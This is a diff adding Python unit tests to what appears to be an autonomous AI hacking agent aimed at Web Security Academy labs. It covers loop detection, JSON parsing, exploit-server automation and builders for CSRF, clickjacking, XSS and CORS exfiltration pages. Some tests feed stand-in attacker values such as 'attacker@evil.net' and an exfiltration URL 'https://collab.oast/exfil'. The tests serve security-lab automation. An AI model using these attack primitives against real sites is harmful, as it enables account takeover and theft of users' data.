@@ -762,5 +762,359 @@ class OrchestratorDryRunTests(unittest.TestCase):
             orch.logger.close()
 
 
+# =============================================================================
+# imp-loop: StallDetector (no-progress / loop detection)
+# =============================================================================
+
+class StallDetectorTests(unittest.TestCase):
+    def test_stall_fires_after_patience_no_progress_steps(self):
+        from hacking_agent.core.strategy import StallDetector
+
+        det = StallDetector(patience=3)
+        # First observation never stalls (nothing to compare against).
+        self.assertFalse(det.record(
+            agent="recon", phase="recon", hypothesis_id="h1",
+            kg_count=0, evidence_count=0,
+        ))
+        # Three consecutive no-progress steps -> stall on the third.
+        self.assertFalse(det.record(
+            agent="recon", phase="recon", hypothesis_id="h1",
+            kg_count=0, evidence_count=0,
+        ))
+        self.assertFalse(det.record(
+            agent="recon", phase="recon", hypothesis_id="h1",
+            kg_count=0, evidence_count=0,
+        ))
+        self.assertTrue(det.record(
+            agent="recon", phase="recon", hypothesis_id="h1",
+            kg_count=0, evidence_count=0,
+        ))
+
+    def test_progress_resets_stall_counter(self):
+        from hacking_agent.core.strategy import StallDetector
+
+        det = StallDetector(patience=2)
+        det.record(agent="recon", phase="recon", hypothesis_id="h1",
+                   kg_count=0, evidence_count=0)
+        det.record(agent="recon", phase="recon", hypothesis_id="h1",
+                   kg_count=0, evidence_count=0)
+        # New KG entity = progress, resets the counter.
+        self.assertFalse(det.record(
+            agent="recon", phase="recon", hypothesis_id="h1",
+            kg_count=5, evidence_count=0,
+        ))
+        self.assertEqual(det.stall_count, 0)
+        # A later phase also counts as progress.
+        self.assertFalse(det.record(
+            agent="exploitation", phase="injection", hypothesis_id="h1",
+            kg_count=5, evidence_count=0,
+        ))
+
+    def test_orchestrator_stall_forces_backtrack_and_pivot(self):
+        from hacking_agent.core.strategy import StallDetector
+
+        target = "https://0abc.web-security-academy.net/"
+        profile = detect_lab_profile("Reflected XSS lab. Target: " + target, target)
+        orch = _build_offline_orchestrator(target, "Reflected XSS lab.",
+                                           lab_profile=profile)
+        try:
+            with patch("hacking_agent.cli.orchestrator.console"):
+                orch._seed_hypotheses()
+                h = orch._select_active_hypothesis()
+                self.assertIsNotNone(h)
+                orch.stall_detector = StallDetector(patience=1)
+                # First step registers a baseline (no stall yet).
+                orch._check_stall("recon")
+                self.assertFalse(orch._needs_pivot)
+                # Second step with no new KG/evidence/phase -> stall -> backtrack.
+                orch._check_stall("recon")
+                self.assertTrue(orch._needs_pivot)
+                self.assertEqual(h.status, "demoted")
+                self.assertGreaterEqual(orch._stall_forced_pivots, 1)
+        finally:
+            orch.logger.close()
+
+
+# =============================================================================
+# imp-loop: redundant-recon guard
+# =============================================================================
+
+class ReconGuardTests(unittest.TestCase):
+    def test_redundant_recon_advances_phase_and_reroutes(self):
+        target = "https://0abc.web-security-academy.net/"
+        profile = detect_lab_profile("Reflected XSS lab. Target: " + target, target)
+        orch = _build_offline_orchestrator(target, "Reflected XSS lab.",
+                                           lab_profile=profile)
+        try:
+            with patch("hacking_agent.cli.orchestrator.console"):
+                orch._seed_hypotheses()
+                h = orch._select_active_hypothesis()
+                self.assertEqual(h.phase, "recon")
+                # Materialize the recon surface for this vector.
+                orch.memory.add_entity("Endpoint", {"url": target + "search"})
+                orch._recon_materialized.add(orch._recon_signature(h))
+
+                task = AgentTask(task_description="Re-run recon on target.",
+                                 context={})
+                self.assertTrue(orch._recon_is_redundant(task))
+                routed, new_task = orch._advance_past_recon(task)
+                self.assertNotEqual(routed, "recon")
+                self.assertNotEqual(h.phase, "recon")
+                self.assertIn("recon-guard", new_task.task_description)
+        finally:
+            orch.logger.close()
+
+    def test_recon_not_redundant_without_materialized_surface(self):
+        target = "https://0abc.web-security-academy.net/"
+        profile = detect_lab_profile("Reflected XSS lab. Target: " + target, target)
+        orch = _build_offline_orchestrator(target, "Reflected XSS lab.",
+                                           lab_profile=profile)
+        try:
+            with patch("hacking_agent.cli.orchestrator.console"):
+                orch._seed_hypotheses()
+                orch._select_active_hypothesis()
+                task = AgentTask(task_description="Initial recon.", context={})
+                self.assertFalse(orch._recon_is_redundant(task))
+        finally:
+            orch.logger.close()
+
+
+# =============================================================================
+# imp-schema: JSON pre-extraction + coercion + safe fallback
+# =============================================================================
+
+class JsonExtractionTests(unittest.TestCase):
+    def test_extract_strips_json_fence(self):
+        from hacking_agent.core.providers import _extract_json_object
+
+        raw = "```json\n{\"a\": 1, \"b\": \"x\"}\n```"
+        self.assertEqual(_extract_json_object(raw), '{"a": 1, "b": "x"}')
+
+    def test_extract_drops_leading_and_trailing_prose(self):
+        from hacking_agent.core.providers import _extract_json_object
+
+        raw = 'Sure! Here is the JSON:\n{"k": "v"}\nHope that helps.'
+        self.assertEqual(_extract_json_object(raw), '{"k": "v"}')
+
+    def test_extract_is_brace_balanced_and_string_aware(self):
+        from hacking_agent.core.providers import _extract_json_object
+
+        raw = 'noise {"outer": {"inner": "}"}} trailing'
+        extracted = _extract_json_object(raw)
+        self.assertEqual(json.loads(extracted), {"outer": {"inner": "}"}})
+
+    def test_extract_handles_think_block(self):
+        from hacking_agent.core.providers import _extract_json_object
+
+        raw = "<think>let me reason</think>\n{\"give_up\": false}"
+        self.assertEqual(json.loads(_extract_json_object(raw)), {"give_up": False})
+
+    def test_coerce_unwraps_single_item_list(self):
+        from hacking_agent.core.providers import _coerce_to_schema
+
+        data = _coerce_to_schema([{"diagnosis": "stuck"}], PivotDecision)
+        self.assertIsInstance(data, dict)
+        self.assertEqual(data["diagnosis"], "stuck")
+        self.assertTrue(PivotDecision.model_validate(data))
+
+    def test_fenced_prose_and_list_all_parse_into_pivot_decision(self):
+        from hacking_agent.core.providers import (
+            _coerce_to_schema, _extract_json_object,
+        )
+
+        cases = [
+            '```json\n{"diagnosis":"a","give_up":true}\n```',
+            'Here you go: {"diagnosis":"b","give_up":false} end',
+            '[{"diagnosis":"c"}]',
+        ]
+        for raw in cases:
+            with self.subTest(raw=raw):
+                data = json.loads(_extract_json_object(raw))
+                data = _coerce_to_schema(data, PivotDecision)
+                self.assertTrue(PivotDecision.model_validate(data))
+
+    def test_safe_fallback_only_for_all_optional_schema(self):
+        from hacking_agent.core.providers import _safe_fallback
+        from hacking_agent.core.schemas import AnalystOutput
+
+        fallback = _safe_fallback(PivotDecision)
+        self.assertIsInstance(fallback, PivotDecision)
+        self.assertFalse(fallback.give_up)
+        # A schema with security-relevant required fields must NOT fabricate one.
+        self.assertIsNone(_safe_fallback(AnalystOutput))
+
+    def test_repair_prompt_includes_error_and_example(self):
+        from hacking_agent.core.providers import _repair_prompt
+
+        try:
+            PivotDecision.model_validate({"give_up": "not-a-bool"})
+        except Exception as err:
+            prompt = _repair_prompt(PivotDecision, err)
+        self.assertIn("failed schema validation", prompt.lower())
+        self.assertIn("give_up", prompt)
+
+
+# =============================================================================
+# imp-primitives: deterministic exploit-primitives builders
+# =============================================================================
+
+class ExploitPrimitivesTests(unittest.TestCase):
+    def test_double_submit_sets_cookie_before_submit_via_onload(self):
+        from hacking_agent.core import exploit_primitives as p
+
+        page = p.csrf_double_submit(
+            "https://lab/my-account/change-email",
+            email_field="email",
+            csrf_field="csrf",
+            token="FORGED",
+            cookie_setter_url="https://lab/?search=inject",
+            email_value="attacker@evil.net",
+        )
+        body = page.body
+        # Cookie is planted by the img load, and submit fires from its onload.
+        self.assertIn("onload=", body)
+        self.assertNotIn("onerror", body)
+        # Submit must happen exactly once, driven by the cookie-setter onload.
+        self.assertEqual(body.count(".submit()"), 1)
+        img_idx = body.index("<img")
+        submit_idx = body.index(".submit()")
+        self.assertLess(img_idx, submit_idx)
+        # Both the form token and cookie-setter URL are present.
+        self.assertIn("FORGED", body)
+        self.assertIn("https://lab/?search=inject", body)
+        self.assertEqual(page.head, p.DEFAULT_HTML_HEAD)
+
+    def test_autosubmit_form_has_form_and_script_submit(self):
+        from hacking_agent.core import exploit_primitives as p
+
+        page = p.csrf_autosubmit_form(
+            "https://lab/email", {"email": "x@evil.net", "csrf": "T"},
+        )
+        self.assertIn(f'id="{p.FORM_ID}"', page.body)
+        self.assertIn(".submit()", page.body)
+        self.assertIn('name="email"', page.body)
+
+    def test_clickjacking_frame_has_opacity_overlay_iframe(self):
+        from hacking_agent.core import exploit_primitives as p
+
+        page = p.clickjacking_frame("https://lab/my-account", decoy_text="Win a prize")
+        self.assertIn("opacity", page.body)
+        self.assertIn("<iframe", page.body)
+        self.assertIn("https://lab/my-account", page.body)
+        self.assertIn("Win a prize", page.body)
+
+    def test_cors_exfil_page_uses_credentialed_fetch_and_beacon(self):
+        from hacking_agent.core import exploit_primitives as p
+
+        page = p.cors_exfil_page(
+            "https://lab/api/key", "https://collab.oast/exfil",
+        )
+        self.assertIn("withCredentials = true", page.body)
+        self.assertIn("https://lab/api/key", page.body)
+        self.assertIn("https://collab.oast/exfil", page.body)
+
+    def test_xss_dom_mode_uses_iframe(self):
+        from hacking_agent.core import exploit_primitives as p
+
+        reflected = p.xss_delivery_page("https://lab/?q=<script>", mode="reflected")
+        self.assertIn("location", reflected.body)
+        dom = p.xss_delivery_page("https://lab/#x", mode="dom")
+        self.assertIn("<iframe", dom.body)
+
+
+# =============================================================================
+# imp-exploitsrv: exploit-server discovery + field parsing (mocked HTTP)
+# =============================================================================
+
+class ExploitServerTests(unittest.TestCase):
+    def test_discovers_url_from_exploit_link(self):
+        from hacking_agent.core.exploit_server import discover_exploit_server_url
+
+        html = (
+            '<a id="exploit-link" href="https://exploit-abc.exploit-server.net/">'
+            "Go to exploit server</a>"
+        )
+        url = discover_exploit_server_url("https://lab", lab_html=html)
+        self.assertEqual(url, "https://exploit-abc.exploit-server.net")
+
+    def test_field_discovery_reads_custom_names_with_fallback(self):
+        from hacking_agent.core.exploit_server import ExploitServer
+
+        default_page = (
+            '<form><input name="responseHead"><textarea name="responseBody">'
+            '</textarea><input name="responseFile"><input name="urlIsHttps">'
+            '<input name="formAction"></form>'
+        )
+
+        def http_get(url, follow_redirects=True):
+            return default_page
+
+        posts = []
+
+        def http_post(url, data, headers=None):
+            posts.append((url, data))
+            return "HTTP/1.1 200 OK\n\nstored"
+
+        server = ExploitServer("https://exploit-abc.exploit-server.net",
+                               http_get=http_get, http_post=http_post)
+        fields = server.form_fields()
+        self.assertEqual(fields.head, "responseHead")
+        self.assertEqual(fields.action, "formAction")
+
+        self.assertTrue(server.store("HEAD", "BODY", path="/exploit", https=True))
+        self.assertTrue(posts)
+        _, data = posts[0]
+        self.assertIn("formAction=STORE", data)
+        self.assertIn("responseBody=BODY", data)
+        self.assertIn("urlIsHttps=on", data)
+
+    def test_deliver_reuses_last_store_fields(self):
+        from hacking_agent.core.exploit_server import ExploitServer
+
+        posts = []
+
+        def http_get(url, follow_redirects=True):
+            return None  # force fallback field names
+
+        def http_post(url, data, headers=None):
+            posts.append(data)
+            return "HTTP/1.1 302 Found\n\n"
+
+        server = ExploitServer("https://exploit-abc.exploit-server.net",
+                               http_get=http_get, http_post=http_post)
+        self.assertTrue(server.store("HEAD", "BODY"))
+        self.assertTrue(server.deliver_to_victim())
+        self.assertIn("formAction=STORE", posts[0])
+        self.assertIn("formAction=DELIVER_TO_VICTIM", posts[1])
+
+    def test_is_lab_solved_detects_banner(self):
+        from hacking_agent.core.exploit_server import is_lab_solved
+
+        self.assertTrue(is_lab_solved("<div class='is-solved'>"))
+        self.assertTrue(is_lab_solved("Congratulations, you solved the lab"))
+        self.assertFalse(is_lab_solved("not yet"))
+
+
+# =============================================================================
+# imp-loop: durable boost/demote folds into deterministic tool ranking
+# =============================================================================
+
+class ToolSelectorDurableTests(unittest.TestCase):
+    def test_boost_and_demote_shift_tool_scores(self):
+        from hacking_agent.core.tool_selector import rank_tools
+
+        available = ["sqlmap", "nuclei_scan", "http_request"]
+        base = {r["tool"]: r["score"]
+                for r in rank_tools("sqli", "exploit", available_tools=available)}
+        boosted = {r["tool"]: r["score"] for r in rank_tools(
+            "sqli", "exploit", available_tools=available,
+            boost_tools=["nuclei_scan"], demote_tools=["sqlmap"],
+        )}
+        if "nuclei_scan" in base and "nuclei_scan" in boosted:
+            self.assertGreater(boosted["nuclei_scan"], base["nuclei_scan"])
+        if "sqlmap" in base and "sqlmap" in boosted:
+            self.assertLess(boosted["sqlmap"], base["sqlmap"])
+
+
 if __name__ == "__main__":
     unittest.main()
